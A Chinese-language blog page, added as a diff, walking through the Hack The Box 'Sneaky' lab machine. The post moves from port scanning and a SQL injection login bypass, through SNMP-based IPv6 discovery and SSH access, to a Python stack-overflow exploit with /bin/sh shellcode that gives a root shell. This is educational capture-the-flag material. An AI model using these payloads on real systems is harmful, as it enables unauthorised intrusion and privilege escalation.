@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="htb walkthrough,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="扫描端口信息：  访问web页面如下：  爆破子目录信息：  访问dev子页面如下:  猜测可能存在sql injection，经过尝试，利用admin’ or ‘1’=’1成功注入  发现两个用户名和一个rsa key：  但是端口扫描并没有发现靶机的ssh端口服务，重新对靶机的端口信息进行扫描  发现161端口有snmp udp服务 经过一番摸索，利用snmp扫描出靶机的ipv6地址，利用了脚">
+<meta name="keywords" content="htb walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb-sneaky-walkthrough">
+<meta property="og:url" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/index.html">
+<meta property="og:site_name" content="Ha0Za1-Pages">
+<meta property="og:description" content="扫描端口信息：  访问web页面如下：  爆破子目录信息：  访问dev子页面如下:  猜测可能存在sql injection，经过尝试，利用admin’ or ‘1’=’1成功注入  发现两个用户名和一个rsa key：  但是端口扫描并没有发现靶机的ssh端口服务，重新对靶机的端口信息进行扫描  发现161端口有snmp udp服务 经过一番摸索，利用snmp扫描出靶机的ipv6地址，利用了脚">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/nmap.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/web_page.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/gobuster.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/dev_page.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/injection.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/rsa_key.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/nmap_udp.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/ipv6_addr.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/nmap_6.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/user.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/suid.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/disass_main.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/pattern_offset.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/root.png">
+<meta property="og:updated_time" content="2020-01-17T12:29:13.462Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="htb-sneaky-walkthrough">
+<meta name="twitter:description" content="扫描端口信息：  访问web页面如下：  爆破子目录信息：  访问dev子页面如下:  猜测可能存在sql injection，经过尝试，利用admin’ or ‘1’=’1成功注入  发现两个用户名和一个rsa key：  但是端口扫描并没有发现靶机的ssh端口服务，重新对靶机的端口信息进行扫描  发现161端口有snmp udp服务 经过一番摸索，利用snmp扫描出靶机的ipv6地址，利用了脚">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/nmap.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/">
+
+
+
+
+
+  <title>htb-sneaky-walkthrough | Ha0Za1-Pages</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ha0Za1-Pages</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/htb-sneaky-walkthrough/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ha0Za1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ha0Za1-Pages">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">htb-sneaky-walkthrough</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-17T20:27:29+08:00">
+                2020-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>扫描端口信息：</p>
+<p><img src="nmap.png" alt="nmap"></p>
+<p>访问web页面如下：</p>
+<p><img src="web_page.png" alt="web_page"></p>
+<p>爆破子目录信息：</p>
+<p><img src="gobuster.png" alt="gobuster"></p>
+<p>访问<code>dev</code>子页面如下:</p>
+<p><img src="dev_page.png" alt="dev"></p>
+<p>猜测可能存在sql injection，经过尝试，利用<strong>admin’ or ‘1’=’1</strong>成功注入</p>
+<p><img src="injection.png" alt="sql_injection"></p>
+<p>发现两个用户名和一个rsa key：</p>
+<p><img src="rsa_key.png" alt="rsa_key"></p>
+<p>但是端口扫描并没有发现靶机的ssh端口服务，重新对靶机的端口信息进行扫描</p>
+<p><img src="nmap_udp.png" alt="nmap_udp"></p>
+<p>发现161端口有snmp udp服务</p>
+<p>经过一番摸索，利用snmp扫描出靶机的ipv6地址，利用了脚本(Enyx)[<a href="https://github.com/trickster0/Enyx]：" target="_blank" rel="noopener">https://github.com/trickster0/Enyx]：</a></p>
+<p><img src="ipv6_addr.png" alt="ipv6_addr"></p>
+<p>而后扫描靶机ipv6地址，发现了22端口ssh服务：</p>
+<p><img src="nmap_6.png" alt="nmap_6"></p>
+<p>利用之前拿到的rsa key，成功登录到靶机内，取到user flag:</p>
+<p><img src="user.png" alt="user"></p>
+<p>搜集靶机内可利用信息：</p>
+<p><img src="suid.png" alt="suid"></p>
+<p>发现一文件<code>/usr/local/bin/chal</code>，取回本地分析，发现为一二进制程序</p>
+<p><img src="disass_main.png" alt="disass_main"></p>
+<p>gdb调试，发现调用了<code>strcpy</code>函数，经过尝试，确认其存在栈溢出：</p>
+<p><img src="pattern_offset.png" alt="pattern_offset"></p>
+<p>确定其<code>eip</code>偏移量为362</p>
+<p>利用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode +=&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span><br><span class="line">shellcode +=&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span><br><span class="line">shellcode +=&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">buffersize = 362</span><br><span class="line"></span><br><span class="line">nop = &quot;\x90&quot; * (buffersize - len(shellcode))</span><br><span class="line">eip = pack(&apos;&lt;L&apos;, 0xbffff860)</span><br><span class="line">payload = nop  + shellcode + eip</span><br><span class="line"></span><br><span class="line">print payload</span><br></pre></td></tr></table></figure>
+<p>成功溢出，拿到shell：</p>
+<p><img src="root.png" alt="root"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/htb-walkthrough/" rel="tag"># htb walkthrough</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/10/htb-lazy-walkthrough/" rel="next" title="htb-lazy-walkthrough">
+                <i class="fa fa-chevron-left"></i> htb-lazy-walkthrough
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.JPG" alt="Ha0Za1">
+            
+              <p class="site-author-name" itemprop="name">Ha0Za1</p>
+              <p class="site-description motion-element" itemprop="description">余不等伞，亦不等雨停</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Mo7Laviiin" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mo7laviiin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
